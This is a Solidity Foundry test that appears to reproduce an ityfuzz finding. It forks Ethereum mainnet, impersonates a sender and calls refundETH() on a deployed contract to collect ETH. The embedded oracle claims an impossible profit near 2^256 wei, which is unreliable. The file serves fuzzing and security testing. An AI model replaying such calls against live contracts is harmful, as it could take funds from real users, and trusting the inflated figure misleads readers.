// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -o -t 0x46161158b1947D9149E066d6d31AF1283b2d377C,0x27E843260c71443b4CC8cB6bF226C3f77b9695AF,0xebF2096E01455108bAdCbAF86cE30b6e5A72aa52,0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48,0xE592427A0AEce92De3Edee1F18E0157C05861564 -c eth --onchain-block-number 15933795 -f -i -p --onchain-etherscan-api-key $ETH_ETHERSCAN_API_KEY
/*

😊😊 Found violations!


================ Oracle ================
Earned 115792089237316195423570985008687907853269984665640564039457584007913129639935000000 more than owed 0, net earned = 115792089237316195423570985008687907853269984665640564039457584007913129639935000000wei (115792089237316195423570985008687907853269984665640564039457ETH)

================ Trace ================
[38;2;205;121;221m[Sender] 0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd[0m
   ├─[1] [38;2;134;21;100m0xE592427A0AEce92De3Edee1F18E0157C05861564[0m.[38;2;255;123;114mrefundETH[0m()
   │  ├─[2] [38;2;205;121;221m[Sender] 0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd[0m.fallback()
   │  │  └─ ← ()


 */

contract C4616 is Test {
    function setUp() public {
        vm.createSelectFork("eth", 15933795);
    }

    function test() public {

        vm.prank(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd);
        
        0xE592427A0AEce92De3Edee1F18E0157C05861564.call(abi.encodeWithSignature(
            "refundETH()"
        )); 
    }

    // Stepping with return
    receive() external payable {}
}

